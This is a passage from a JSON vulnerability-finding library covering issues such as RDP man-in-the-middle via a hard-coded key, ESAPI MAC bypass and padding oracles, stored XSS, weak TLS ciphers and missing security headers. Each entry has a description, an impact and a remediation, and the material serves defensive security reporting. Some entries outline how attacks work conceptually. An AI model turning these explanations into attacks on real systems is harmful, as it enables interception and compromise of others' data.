09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":716,"plugin_id":null,"title":"Application Calls System.exit()","type":null,"description":"The application calls System.exit() to terminate the application. Calling System.exit() not only terminates the application, but also its container. In client contexts this is acceptable, but web applications should never attempt to shut down the container.\n","poc":null,"impact":"Calling System.exit() in a web application will shut down the application and its container, rendering the server unreachable and creating a denial of service condition for all applications running in that container.\n","remediation":"Any shutdown functionality for an application should be handled through the container. Calls to System.exit() should therefore never be used. Different containers, such as JBoss and Tomcat, provide front ends for shutdown functionality via Java Management Extensions (JMX) that will correctly shut down a web application without ending the container's process.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":717,"plugin_id":null,"title":"Terminal Services Does Not Use Network Level Authentication (NLA) Only","type":null,"description":"The remote RDP server does not use Network Level Authentication (NLA), allowing clients to establish RDP sessions prior to successful server authentication. NLA ensures that a user is authenticated to the remote desktop session host server before an RDP session is established. To do this, NLA leverages Credential Security Support Protocol (CredSSP) through Kerberos or TLS/SSL.\n","poc":null,"impact":"Allowing RDP sessions to be established by anonymous users causes the RDP server to spend additional resources that may not be required since the user may not have valid credentials. An attacker can abuse this design by establishing many unauthenticated RDP sessions in an attempt to create a denial of service condition on the server.\n","remediation":"Configure the remote RDP server to require Network Level Authentication (NLA). On a per-server basis, this can be configured in RD Session Host Configuration. For more information, see the Microsoft TechNet article:\nhttps://technet.microsoft.com/en-us/library/hh750380.aspx\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":718,"plugin_id":null,"title":"Microsoft Windows Remote Desktop Protocol Server Man-in-the-Middle Weakness","type":null,"description":"The version of Microsoft Windows RDP server running on the remote server is vulnerable to a man-in-the-middle (MITM) attack. In version 5.2, the RDP server stores a hard-coded RSA private key in its \"msltapi.dll\" library, which is accessible to any local user on the machine. This private key is the same across all installations of Microsoft Windows RDP server, leaving all instances of the RDP server vulnerable to this attack. At a high level, the attack works as follows:\n--During the initial key-exchange phase, the RDP server sends a server certificate to the RDP client. This certificate is stored in the server's registry under the following key:\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters\\Certificate\nIt contains the server's public key and its corresponding digital signature. The RDP client uses this digital signature in order to verify the server's identity.</li> <li>From a man-in-the-middle attacker's standpoint, the server's public key signature needs to be modified on the fly in order to trick the client into verifying a new public key that will be replaced in the network packet sent to the client.</li> <li>The RDP server signs its public key with the RSA private key that is hard-coded into the \"mstlsapi.dll\" library, essentially making this private key \"public\".</li> <li>With knowledge of this private key, the attacker calculates a valid signature for the public key, leading the client to verify the signature correctly and accept the session without issuing any warnings to the user.</li> </ol>\n","poc":null,"impact":"By exploiting the RDP Server's MitM vulnerability, an attacker can intercept and decrypt a victim's RDP network traffic. Any sensitive information exchanged between the client and the server will be exposed, including authentication credentials. This attack is invisible to the end user, since the RDP client does not report that the server keys have changed.\n","remediation":"Server authentication must be altered to leverage a mechanism that does not rely on the default private key. Depending on the environment, the following solutions can mitigate the RDP Man-in-the-Middle vulnerability.\n--Network Level Authentication (NLA):\n\nNLA leverages the Credential Security Support Provider (CredSSP) to enforce strong server authentication via Kerberos or TLS/SSL mechanisms. An added security benefit to using NLA is that it helps protect the remote computer from malicious users and software by completing authentication prior to a full RDP session being established.\nNLA can be implemented in one of a few ways. NLA with Kerberos is one of the most secure server authentication solutions for protecting against MITM attacks. In case Kerberos cannot be used (e.g. the RDP client and RDP server are not a part of the same trusted domain), X.509 certificates issued by a trusted CA will allow the client to verify the server's identity and protect against MitM attacks. If X.509 certificates are not configured on the server and Kerberos is not feasible, NLA can be used with NTLM authentication in order to establish trust between the RDP client and the RDP server</li> <li>Pure TLS/SSL\nTLS/SSL allows the RDP client to authenticate the RDP server and provides a secure communication channel. This can easily be implemented by installing certificates issued by a trusted CA on the RDP server.</li> <li>Network Level Protection Mechanisms\nIn case the RDP server's OS version does not support NLA or pure TLS/SSL authentication mechanisms, IPsec policies may be configured to enable mutual authentication between the RDP client and server and protect RDP traffic from MitM attacks.</li> <li>Virtual Private Network (VPN)\nA VPN tunnel may be established to secure the connection between the RDP client and the server, especially when the connection from the client to the server is over the Internet.</li> </ol>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":719,"plugin_id":null,"title":"Use of ESAPI Encryptor","type":null,"description":"The application uses a version or configuration of ESAPI's Encryptor with known vulnerabilities. ESAPI's Encryptor interface provides developers with a centralized set of functions for performing basic cryptographic operations. As of November 2016, two \"Common Vulnerabilities and Exposures\" (CVE) vulnerability entries have been published against Encryptor. The first, CVE-2013-5679, details a MAC bypass in ESAPI versions 2.x before 2.1.0, involving abuse of a null MAC of length zero. The second, CVE-2013-5960, details another MAC bypass in the default configuration of ESAPI versions 2.x before 2.1.1, involving flawed logic in helper functions that determine whether a MAC is required or not.\n","poc":null,"impact":"By leveraging the CVEs currently open against the ESAPI Encryptor interface, an attacker may be able to decrypt application traffic. Both of the listed CVEs provide an attacker with a method for bypassing the message authentication codes (MAC) (i.e. integrity checks) used by the application. An attacker with the ability to intercept and modify application traffic can perform chosen ciphertext attacks (e.g. the padding oracle attack) against the application to decrypt messages sent using the vulnerable scheme.\nPadding oracle attacks work by modifying ciphertext in a way that alters block cipher padding and observing the results of this modification. An attacker in this scenario is looking for information about whether the ciphertext he or she has sent has the \"correct\" padding format. By combining this information with how the ciphertext was modified, attackers can gain enough information to decrypt messages one byte at a time, starting with the padding.\n","remediation":"A more frequently updated cryptography library should be used in place of ESAPI Encryptor, such as wolfCrypt, Bouncy Castle, or even a standard language implementation such as Java's.\nIf ESAPI must be used, the library should be upgraded to the latest version (2.1.0 as of March 2017) and employ a secure configuration. ESAPI 2.1.0 fixes CVE-2013-5679, but is still vulnerable to CVE-2013-5960. In order to prevent padding oracle attacks, the following configuration is recommended:\n<pre><code class=\"\">Encryptor.CipherText.useMAC=true Encryptor.EncryptionAlgorithm=AES Encryptor.CipherTransformation=AES/GCM/NoPadding Encryptor.cipher_modes.additional_allowed= </pre>\nThis configuration enforces MAC usage, sets the default encryption mode to GCM (which is not vulnerable to padding oracle attacks) and disallows CBC as an additional potential encryption mode since it can be vulnerable to padding oracle attacks.\n","cvss_base_score":5.8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":720,"plugin_id":null,"title":"Stored Cross-Site Scripting (XSS)","type":null,"description":"A Stored Cross-Site Scripting (XSS) vulnerability occurs when a web application sends stored strings that were provided by an attacker to a victim's browser in such a way that the browser executes part of the string as code. The string contains malicious data and is initially stored server-side, often in the application's database. The application later retrieves the malicious data and inserts it into a web page. This results in the victim's browser executing the attacker's code within a legitimate user's session.\n","poc":null,"impact":"Stored Cross-Site Scripting vulnerabilities give the attacker control of HTML and JavaScript running the user's browser. The attack can alter page content with malicious HTML or JavaScript code. The attacker can arbitrarily alter page content displayed to the victim and can execute application functions using the victim's application identity if the victim is authenticated to the application. An often cited example use of a Stored Cross-Site is where the attacker sends himself/herself the victim's session identifier. With this session identifier, the attacker can then perform application functions using that user's identity for the duration of that session.\n","remediation":"Stored Cross-Site Scripting (XSS) is prevented by encoding data before inserting it into the generated web page. Each character of the data is encoded and the result string is then inserted onto the generated web page. This technique of encoding values before inserting them on the web page is called \"Output Encoding\". Output Encoding libraries exist for most popular programming languages and frameworks.\nA web page has seven different output contexts and each output context requires a different encoding scheme. Data must be encoded using the proper scheme. The seven different encoding schemes are:\n--HTML Text Element\n--HTML Attribute\n--URL Parameter\n--JavaScript Literal\n--HTML Comment\n--HTTP Header\n--CSS Property\n\nLibraries for implementing the encoding schemes exist for most popular programming languages.\n--OWASP Java Encoder: Java only\n--Microsoft Web Protection Library: .NET languages\n--Ruby - escapeHTML() - only supports HTML Text Encoding\n--Jgencoder in JQuery: for preventing DOM-based XSS\n\n--Google Capabilities based JavaScript CAJA\n--OWASP JXT- automatically encodes string data with the proper encoding\n\n","cvss_base_score":8,"cvss_temporal_score":7,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:C/A:P/E:H/RL:OF/RC:C/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Critical","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:28:19","approved":1,"v_likelihood":"Critical","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":721,"plugin_id":null,"title":"Weak SSL/TLS Configuration","type":null,"description":"The application server-side SSL/TLS endpoint is configured to allow weak SSL/TLS cipher suites. A server-side SSL/TLS endpoint that supports weak ciphers could allow an attacker to read or modify traffic sent in SSL/TLS connections with that endpoint. These cipher suites have proven cryptographic flaws that can allow an attacker to decrypt or modify traffic. These weak cipher suites include the following:\n-- Cipher suites that use RC4 for encryption; RC4 contains several known weaknesses. In particular, an attacker that can gather a large number of cipher texts that contain the same plaintext encrypted using different keys may be able to recover the plaintext (the typical target of this attack would be a cookie that is sent in multiple SSL/TLS sessions).\n-- Cipher suites that use block ciphers (e.g. AES, 3DES) in CBC mode; these are vulnerable to the BEAST attack if SSL 3.0 or TLS 1.0 are supported. Even if newer versions of TLS are also supported by the server, older client software might establish SSL 3.0 or TLS 1.0 connections. Additionally, an attacker may be able to use the POODLE attack to downgrade the connection to SSL 3.0 or TLS 1.0 even if both the client and the server support newer versions of TLS. BEAST allows an attacker on the same network as an end user, who can inject code into any site open in the user's browser, to decrypt cookies (or other sensitive data that is part of each request) for the vulnerable site.\n-- Cipher suites that use the DES block cipher; these cipher suites use 56-bit keys for encryption, which are brute-forceable.\n-- EXPORT-strength cipher suites use encryption key lengths that are vulnerable to brute force attacks (40 bits or 56 bits for symmetric key algorithms and 512 bits for the RSA asymmetric key algorithm). Note that even if stronger algorithms are preferred by the server, having EXPORT-strength cipher suites enabled is dangerous due to attacks like FREAK and Logjam.\n-- Cipher suites with NULL for encryption do not offer any encryption for the connection.\n-- Anonymous Diffie-Hellman cipher suites do not authenticate the endpoints and are vulnerable to man-in-the-middle attackers that can perform active attacks to read/modify traffic.\nA server-side SSL/TLS endpoint that supports weak ciphers could allow an attacker to read or modify traffic sent in SSL/TLS connections with that endpoint.","poc":"","impact":"","remediation":"The server-side TLS endpoint's configuration should be updated to allow only TLSv1.2 connections with cipher suites that use:\n--Ephemeral Diffie-Hellman for key exchange (optionally, allow RSA for key exchange if necessary for supporting some clients)\n--Block ciphers with key lengths of at least 128 bits (AES-128 and AES-256; optionally allow 3DES with 112-bit keys if necessary for supporting some clients)\n--Block ciphers in GCM mode. Note: If CBC mode must be allowed for supporting some clients, use only CBC mode cipher suites that use the SHA2 family of hash functions (SHA256, SHA384, SHA512)","cvss_base_score":6.1,"cvss_temporal_score":5,"cvss_vector":"(AV:N/AC:H/Au:N/C:C/I:P/A:N/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2019-01-14 06:45:25","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":"","likelihood_text":""},{"id":722,"plugin_id":null,"title":"iOS Keychain Used without Security Access Control","type":null,"description":"TouchID-related Security Access Controls are not set on Keychain items inserted when using TouchID. In iOS 9, Apple introduced the ACL authentication types \"TouchIDAny\" and \"TouchIDCurrentSet.\" These types require the use of TouchID; they do not allow fallback to a passcode. As such, the use of these authentication types provides greater security for sensitive data stored in the Keychain.\nSpecifically:\n--TouchIDAny requires that TouchID be available and that at least one finger is enrolled (at all times) to access the data. The Item is still available even if fingers are added or removed. Access to the data is only provided with a successful TouchID authentication.\n--TouchIDCurrentSet requires that TouchID be available and that at least one finger is enrolled (at all times) to access the data, though if fingers are added or removed the item is no longer accessible.\n\nInserting secrets (sensitive data) into the keychain prior to the iOS 9 SDK updates does not provide a secure association with TouchID access. As a result, data is not protected by biometric security or another second factor. Prior to iOS 9 SDK updates, access to a keychain entry can be obtained through the use of the weaker device passcode.\nFor example, consider an application that would like to utilize TouchID as an authentication mechanism. The application will store an access token in the keychain. This token will be used to perform server-side actions, without requiring password entry for future use.  When the application needs the authentication token, it will call the LocalAuthentication Framework to perform a TouchID Authentication. The application will then, on success, query the Keychain for the token. Since access to the token, in the keychain, is only \"programmatically\" controlled, the token may be obtained outside the program controls and utilized without a successful Touch ID Authentication. By setting one of the Security Access Control authentication types for keychain entries introduced in iOS 9, the system encrypts the contents in the keychain entry (the token) with a key stored in the Secure Enclave. The system then requires a successful authentication (via TouchID) before providing access to the decrypted keychain entry. This additional control protects the keychain entry (the token) at the system level rather than programmatically, thus preventing potential bypass of the TouchID authentication control (programmatic control).\n","poc":null,"impact":"Access to sensitive data without the iOS 9-introduced TouchID Security Access Control may result in information stored in the Keychain being leaked when using a device passcode. A Device passcode is typically weaker than a password which would be required by any other mechanisms, and as such increases the risk of unauthorized access to the data or system.\n","remediation":"Enforce the use of TouchID by associating a keychain entry with the appropriate ACL authentication types (\"TouchIDAny\" or \"TouchIDCurrentSet\") when adding the entry to the Keychain using the Apple Keychain API. To use the TouchID ACL authentication types, a minimum OS of iOS 9 must be used.\nIf these controls are desired for updated devices while maintaining support for older devices (accepting weaker authentication), framework support/iOS version detection will need to be added to the application.\nNote: All of this logic is performed client-side, and as such can still be bypassed with appropriate access to the device; these additional controls can, however, help improve the application's overall security posture.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":723,"plugin_id":null,"title":"Insecure Encryption Algorithm in Use (3DES)","type":null,"description":"The application uses the Triple-DES (3DES) encryption algorithm. Due to the short block length (64 bits) of 3DES, some usage scenarios may be vulnerable to \"birthday attacks\". One such example is the Sweet32 attack against 3DES cipher suites in TLS.\n","poc":null,"impact":"In the scenario where a large amount of plaintext is encrypted using the same 3DES key, and the attacker knows what a large percentage of the plaintext is (e.g. if the plaintext consists of HTTP requests where most of the request contents are predictable), the attacker may be able to use ciphertext collisions to compute some of the unknown parts of the plaintext.\n","remediation":"Use an encryption algorithm with a block length of 128 bits or greater. The AES encryption algorithm is a good option.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":724,"plugin_id":null,"title":"Insecure Encryption Algorithm in Use (CAST)","type":null,"description":"The application uses the CAST5 (also known as CAST-128) encryption algorithm. Due to the short block length (64 bits) of CAST5, some usage scenarios may be vulnerable to \"birthday attacks\". One such example is the Sweet32 attack against 3DES cipher suites in TLS. Additionally, CAST5 can be used with keys that are between 40 bits and 128 bits in length. Key lengths other than 128 bits should be avoided.\n","poc":null,"impact":"In the scenario where a large amount of plaintext is encrypted using the same CAST key, and the attacker knows what a large percentage of the plaintext is, the attacker may be able to use ciphertext collisions to compute some of the unknown parts of the plaintext.\nIf short key lengths are used with CAST, the attacker may be able to brute force the key to decrypt all ciphertext.\n","remediation":"Use an encryption algorithm with a block length of 128 bits or greater. The AES encryption algorithm is a good option.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":725,"plugin_id":null,"title":"Hostname Verification Disabled (Android)","type":null,"description":"The application connects to a server that provides a certificate but fails to ensure that the certificate is actually associated with the intended host. Any valid signed certificate (one that can be verified using the trust store) is accepted by the application when connecting to a target host regardless of whether the hostname within the provided certificate matches the target host's. This occurs when the application's hostname verifier is misconfigured to use ALLOW_ALL_HOSTNAME_VERIFIER within the SSLSocketFactory created when initiating the connection.\n","poc":null,"impact":"Disabling hostname verification leaves the application susceptible to man-in-the-middle (MiTM) attacks. A network-based attacker positioned between the client and server can present the application with a trusted certificate to masquerade as another server. Because the application is not configured to verify the hostname presented in the certificate, the user will unknowingly communicate with the MiTM attacker. As a result, the attacker can obtain sensitive user data and session cookies from these requests, as well as modify them.\n","remediation":"The application should properly validate the certificate hostname provided by the server. This can be done by setting the HttpsURLConnection's hostname verifier to SSLSocketFactory.STRICT_HOSTNAME_VERIFIER. This ensures that the application checks the target server's hostname with the subjectAltName field in the provided certificate.\nAlternatively, the application can implement its own HostnameVerifier class. A custom verifier allows the application to specify the exact hostname to accept from the server's certificate, regardless of what URL hostname is present. This may be required when using virtual hosting, where one server might have multiple hostnames.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":726,"plugin_id":null,"title":"Application Uses WebView to Save Username and Password (Android)","type":null,"description":"The application configures a WebView to allow saving values entered into password fields. As a result, when a user enters values into password fields, he/she will be presented a prompt asking whether the entered password should be saved. If the user chooses to save the password, it will be stored in cleartext in the application's filesystem sandbox.\n","poc":null,"impact":"Users' passwords may be stored in the application's filesystem sandbox in cleartext, and could potentially be compromised by privileged malware or by an attacker with physical access to a user's device.\n","remediation":"Configure WebView settings to disable saving passwords. Note that the API for enabling/disabling this setting has been deprecated as of API level 18, and according to Google, saving passwords in WebViews will not be supported in future Android versions.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":727,"plugin_id":null,"title":"Missing X-XSS-Protection Header","type":null,"description":"The application server does not set the \"X-XSS-Protection\" header in HTTP responses. The X-XSS-Protection response header is a mechanism supported by some modern web browsers to provide an additional layer of defense against reflected cross-site scripting attacks.\n","poc":null,"impact":"A missing X-XSS-Protection header increases the likelihood of a successful reflected cross-site scripting attack which can give the attacker full control over the HTML and JavaScript running in the victim's browser. Without the X-XSS-Protection header defined, an application has fewer defense layers to prevent reflected cross-site scripting attacks.\n","remediation":"The application or the web server should set the X-XSS-Protection header to reduce the likelihood of successful reflected cross-site scripting attacks. The X-XSS-Protection should be set to the following:\n<pre>X-XSS-Protection: 1; mode=block </pre>\nSetting the X-XSS-Protection header to \"1\" enables the browser's built-in cross-site scripting auditor to analyze the response content for malicious scripts. If the browser detects unsafe or malicious content, the browser will sanitize the response before rendering. However, if the value \"1\" is followed by \"mode=block\", the browser will prevent the page from rendering in case a cross-site scripting attack is detected. Instead, the browser will display an error message to the user.\nNote: Using the X-XSS-Protection header should be considered a security best practice as part of a defense-in-depth strategy to harden the application. The X-XSS-Protection header alone does not guarantee protection against reflected cross-site scripting attacks. The header is not supported by all modern browsers and can also be bypassed using targeted attacks against specific browser versions. To prevent reflected cross-site scripting attacks, output encoding should be implemented in the application whenever data is inserted into a web page.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":728,"plugin_id":null,"title":"Missing X-Content-Type-Options Header","type":null,"description":"The application server does not set the \"X-Content-Type-Options\" header in HTTP responses. The X-Content-Type-Options header mechanism prevents a web browser from overriding the MIME type indicated in the application's Content-Type response header. Most modern browsers can inspect application responses through \"MIME sniffing\" and determine if the correct Content-Type is specified by the application server. When the X-Content-Type-Options header is specified by an application, browsers will not perform MIME sniffing and will trust the Content-Type specified by the application.\nApplications that do not set the X-Content-Type-Options header \"nosniff\" directive explicitly in the application response are more susceptible to MIME Confusion attacks. A MIME confusion attack occurs when an application resource does not provide sufficient metadata to the web browser about the response's content type. In a normal scenario where MIME sniffing is allowed, the web browser sniffs the content of a response to determine which MIME type should be used. Once the web browser has completed its analysis of the response, it compares what is found against the server provided content type header (if present). If the browser detects a mismatched content type, the browser uses the MIME type that it determined on its own.\nFor example, consider an application that allows users to upload JPG image files to the server. In this scenario, an attacker may be able to upload a malicious image file where the content of the file is valid HTML or JavaScript. When the uploaded file is returned in the application response, the browser may sniff the content of the malicious file and determine its MIME type to be HTML or JavaScript. When the malicious image file is rendered by the browser, instead of displaying an image, the attacker's malicious HTML or JavaScript is executed.\n","poc":null,"impact":"Enabled content sniffing makes MIME Confusion attacks possible which, in their turn, lead to cross-site scripting (XSS). Using an XSS, an attacker can arbitrarily alter page content displayed to the victim and can execute application functions using the victim's application identity if the victim is authenticated to the application.\n","remediation":"The application server should set the \"X-Content-Type-Options\" header to \"nosniff\" in the response. The \"nosniff\" directive prevents the browser from using content sniffing algorithms to override the MIME type set by the application server and prevent MIME confusion attacks.\n<pre><code class=\"xml\">X-Content-Type-Options: nosniff </pre>\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":729,"plugin_id":null,"title":"Missing Content-Security-Policy Header","type":null,"description":"The application server does not set the Content-Security-Policy (CSP) header in HTTP responses, and, therefore, the application is at a greater risk of having cross-site scripting or other modern application vulnerabilities. The CSP header sets a policy that instructs the browser to only fetch resources, such as scripts, images, or objects, from the specified locations. A compliant browser will deny loading any resources from locations not listed in the policy. \nCSP allows browsers to differentiate between trusted and untrusted content requested by the page. By default, it also prohibits inline script execution, as well as dynamic script evaluation.\n","poc":null,"impact":"When implemented correctly, the CSP reduces an attacker's ability to inject malicious content and helps protect a web page from attacks like cross-site scripting (XSS), dynamic code execution, clickjacking, remote file inclusion (RFI), and others. The CSP adds an additional line of defense and reduces the overall security risk.\n","remediation":"The application server must set the Content-Security-Policy (CSP) header in each HTTP response with the appropriate directives defined to provide the browser with granular control over the resources loaded by the application. Implementing a CSP should be considered a security best practice as part of a larger defense in depth strategy to reduce the risk of various attacks. CSP alone should not be relied on to prevent attacks such as cross-site scripting, dynamic code execution, clickjacking, remote file inclusion, or other injection attacks.\nTo implement a secure CSP, the application would need to use no inline <script> tags. This often means a rewrite of the whole client side application using one of the CSP-compliant JavaScript frameworks. Otherwise, CSP will block normal execution of the application. Note that setting the script-src directive to 'unsafe-inline' allows execution of any JavaScript injected by an attacker, as well as the execution of legitimate JavaScript.\nHere is an example of a secure CSP.\n<pre>Content-Security-Policy: default-src 'none'; img-src *.images.example.com; media-src media-server.com;  script-src apis.example.com; style-src 'self'; object-src 'none'; frame-ancestors 'self'; upgrade-insecure-requests;  report-uri https://example.com/csp-reports/ </pre>\nCSP has a lot of different directives and settings. Here are some best practices to create a strong security policy:\n--Specify a default policy. It is recommended to set it to 'none'.\n--Specify a whitelist of sources for script-src and object-src directives.\n--Avoid setting default-src and script-src to 'unsafe-inline' or data:. The 'data:' URIs can be used to inject and execute JavaScript.\n--Avoid setting default-src and script-src to 'unsafe-eval'. The 'unsafe-eval' policy allows the use of eval() and similar methods which can be abused for code injection.\n--Avoid setting script-src or default-src to 'self' for hosts containing Angular applications, JSONP endpoints, or files uploaded from users, as attackers can manipulate such applications to execute attacker's code uploaded to the application's host.\n--Avoid setting the object-src directive to *, as it allows loading of arbitrary plugins that can execute JavaScript.\n--Only use third-party URIs that start with https:, as content loaded over HTTP can be modified by an attacker.\n--Set the frame-ancestors directive to specify sources from where the current page can be framed or set it to 'none' to avoid clickjacking.\n\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":730,"plugin_id":null,"title":"Unmasked PHI Data","type":null,"description":"Protected health information (PHI) is displayed in clear text to the end user. PHI refers to any health-related information that is considered sensitive in nature. PHI can be used to identify individuals and to distinguish individuals from one another, depending on the exact data available. The following categories are examples of PHI that may be used to identify an individual:\n--Medical record numbers\n--Health insurance numbers\n--Name, address, and date of birth\n--Phone or fax numbers\n\n","poc":null,"impact":"Including unmasked PHI in application responses may result in the exposure of sensitive information and a loss of confidentiality. PHI included in application responses may be exposed in several ways:\n--Shoulder-surfing or other unauthorized access to the client's system while the victim is logged in\n--Cached responses on the client's system or on systems that route traffic between the client and server\n--Network-based man-in-the-middle attacks\n\n","remediation":"Protected health information (PHI) should be masked or obfuscated in all application input fields and when it is displayed back to the user. PHI data should be masked server side before being sent to the client to be displayed. This will ensure that an end user cannot view the un-masked data (e.g. via HTML source), as well as prevent the data from being intercepted in transit to the client. For example, when the application wants to display a user's medical record number, the server should mask the number to only show the last four digits while the first digits are represented by a place holder, such as an asterisk.  In cases where PHI must be displayed as part of legitimate business functionality, it should be sent to the client only when explicitly requested, rather than embedded in one or more pages by default. In addition, this information should only be displayed for one account at a time.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":731,"plugin_id":null,"title":"Insecure HTTP Methods Enabled","type":null,"description":"Insecure HTTP methods are enabled on the web server. The most common HTTP methods were specified in HTTP 1.0 (GET, POST, and HEAD), while the HTTP 1.1 specification defined 5 more (OPTIONS, PUT, DELETE, TRACE and CONNECT). The following HTTP methods may constitute security issues:\n--PUT may allow a remote user to upload a file to the web server. If the uploaded file already exists then it will be overwritten.\n--DELETE may allow a remote user to remove files from the web server.\n--CONNECT can allow a remote user to use the web server as an HTTP proxy.\n--TRACE can be used to echo a string and associated application HTTP headers back to the client making the request.\n\n","poc":null,"impact":"Insecure HTTP methods enabled on the server may allow an attacker to perform a variety of attacks by modifying server resources and using the server to relay information.\n--PUT may allow an attacker to upload new files to or modify existing files on the server in an attempt to serve malware to victims or render pages in a victim's browser that are under the attacker's control.\n--DELETE may allow an attacker to deny users access to legitimate resources by removing resources from the server.\n--An attacker can use CONNECT to proxy their traffic through the web server, to perform reconnaissance on, or attack, another site, as if the attack originated from your web server, obfuscating the attacker's true origin.\n--TRACE may allow a malicious injected script (see: cross-site scripting) to view an echoed response of an HTTP request. This can allow an attacker to bypass certain protections such as the HttpOnly cookie flag, and observe data to which the script should not otherwise have access, including session token values.\n\n","remediation":"Disable any HTTP methods not needed for the web server to function properly. If the methods are needed, then enable authentication for 